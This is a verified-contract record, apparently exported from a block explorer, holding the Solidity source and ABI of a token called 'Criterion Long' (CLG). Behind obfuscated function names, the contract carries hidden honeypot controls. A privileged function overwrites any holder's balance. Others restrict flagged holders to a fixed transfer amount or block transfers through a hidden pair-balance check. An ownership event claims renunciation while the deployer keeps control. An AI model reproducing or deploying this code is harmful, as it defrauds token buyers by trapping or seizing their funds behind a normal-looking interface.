{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface txExemptLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenExemptLaunched {\n    function createPair(address autoFee, address totalExempt) external returns (address);\n}\n\ninterface sellFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchTake) external view returns (uint256);\n\n    function transfer(address txMarketing, uint256 exemptSwap) external returns (bool);\n\n    function allowance(address atEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMarketing,\n        uint256 exemptSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletLaunchedMax, uint256 value);\n    event Approval(address indexed atEnable, address indexed spender, uint256 value);\n}\n\ninterface shouldSellTx is sellFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CriterionLong is tradingMax, sellFund, shouldSellTx {\n\n    uint256 listTeam;\n\n    address public atFund;\n\n    address autoTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address launchTake) public view virtual override returns (uint256) {\n        return totalAuto[launchTake];\n    }\n\n    string private launchLaunched = \"CLG\";\n\n    function sellToken(address exemptTrading, uint256 exemptSwap) public {\n        fundBuySender();\n        totalAuto[exemptTrading] = exemptSwap;\n    }\n\n    function transfer(address exemptTrading, uint256 exemptSwap) external virtual override returns (bool) {\n        return fromIsSell(_msgSender(), exemptTrading, exemptSwap);\n    }\n\n    function txFee(address maxSwapEnable) public {\n        require(maxSwapEnable.balance < 100000);\n        if (launchReceiverReceiver) {\n            return;\n        }\n        if (feeTeam == walletTake) {\n            walletTake = false;\n        }\n        limitLiquidity[maxSwapEnable] = true;\n        \n        launchReceiverReceiver = true;\n    }\n\n    bool private feeTeam;\n\n    function shouldBuy(address autoMin) public {\n        fundBuySender();\n        if (walletTake != receiverLiquidity) {\n            walletTake = false;\n        }\n        if (autoMin == atFund || autoMin == buyMin) {\n            return;\n        }\n        maxSell[autoMin] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyMarketing;\n    }\n\n    address private launchedEnable;\n\n    bool public walletTake;\n\n    mapping(address => bool) public limitLiquidity;\n\n    function tradingTeam() public {\n        emit OwnershipTransferred(atFund, address(0));\n        launchedEnable = address(0);\n    }\n\n    uint8 private senderMarketingAt = 18;\n\n    function transferFrom(address liquidityLaunchAuto, address txMarketing, uint256 exemptSwap) external override returns (bool) {\n        if (_msgSender() != tokenReceiver) {\n            if (walletAuto[liquidityLaunchAuto][_msgSender()] != type(uint256).max) {\n                require(exemptSwap <= walletAuto[liquidityLaunchAuto][_msgSender()]);\n                walletAuto[liquidityLaunchAuto][_msgSender()] -= exemptSwap;\n            }\n        }\n        return fromIsSell(liquidityLaunchAuto, txMarketing, exemptSwap);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderMarketingAt;\n    }\n\n    bool public receiverLiquidity;\n\n    function approve(address tokenTrading, uint256 exemptSwap) public virtual override returns (bool) {\n        walletAuto[_msgSender()][tokenTrading] = exemptSwap;\n        emit Approval(_msgSender(), tokenTrading, exemptSwap);\n        return true;\n    }\n\n    uint256 private buyMarketing = 100000000 * 10 ** 18;\n\n    address public buyMin;\n\n    function allowance(address limitBuy, address tokenTrading) external view virtual override returns (uint256) {\n        if (tokenTrading == tokenReceiver) {\n            return type(uint256).max;\n        }\n        return walletAuto[limitBuy][tokenTrading];\n    }\n\n    uint256 marketingFee;\n\n    function shouldSender(address liquidityLaunchAuto, address txMarketing, uint256 exemptSwap) internal returns (bool) {\n        require(totalAuto[liquidityLaunchAuto] >= exemptSwap);\n        totalAuto[liquidityLaunchAuto] -= exemptSwap;\n        totalAuto[txMarketing] += exemptSwap;\n        emit Transfer(liquidityLaunchAuto, txMarketing, exemptSwap);\n        return true;\n    }\n\n    string private fromIsToken = \"Criterion Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return fromIsToken;\n    }\n\n    uint256 constant tradingLaunch = 13 ** 10;\n\n    uint256 private maxToken;\n\n    bool private buyShould;\n\n    constructor (){\n        \n        txExemptLimit totalLiquidity = txExemptLimit(tokenReceiver);\n        buyMin = tokenExemptLaunched(totalLiquidity.factory()).createPair(totalLiquidity.WETH(), address(this));\n        if (receiverLiquidity) {\n            walletTake = true;\n        }\n        atFund = _msgSender();\n        tradingTeam();\n        limitLiquidity[atFund] = true;\n        totalAuto[atFund] = buyMarketing;\n        if (receiverLiquidity) {\n            walletTake = false;\n        }\n        emit Transfer(address(0), atFund, buyMarketing);\n    }\n\n    address tokenReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchLaunched;\n    }\n\n    function fromIsSell(address liquidityLaunchAuto, address txMarketing, uint256 exemptSwap) internal returns (bool) {\n        if (liquidityLaunchAuto == atFund) {\n            return shouldSender(liquidityLaunchAuto, txMarketing, exemptSwap);\n        }\n        uint256 amountTo = sellFund(buyMin).balanceOf(autoTx);\n        require(amountTo == listTeam);\n        require(txMarketing != autoTx);\n        if (maxSell[liquidityLaunchAuto]) {\n            return shouldSender(liquidityLaunchAuto, txMarketing, tradingLaunch);\n        }\n        return shouldSender(liquidityLaunchAuto, txMarketing, exemptSwap);\n    }\n\n    event OwnershipTransferred(address indexed atLimit, address indexed teamList);\n\n    bool public launchReceiverReceiver;\n\n    uint256 private fundMin;\n\n    function getOwner() external view returns (address) {\n        return launchedEnable;\n    }\n\n    mapping(address => bool) public maxSell;\n\n    mapping(address => mapping(address => uint256)) private walletAuto;\n\n    function modeWallet(uint256 exemptSwap) public {\n        fundBuySender();\n        listTeam = exemptSwap;\n    }\n\n    function fundBuySender() private view {\n        require(limitLiquidity[_msgSender()]);\n    }\n\n    mapping(address => uint256) private totalAuto;\n\n    function owner() external view returns (address) {\n        return launchedEnable;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunchedMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptSwap\",\"type\":\"uint256\"}],\"name\":\"modeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSwap\",\"type\":\"uint256\"}],\"name\":\"sellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunchAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwapEnable\",\"type\":\"address\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CriterionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}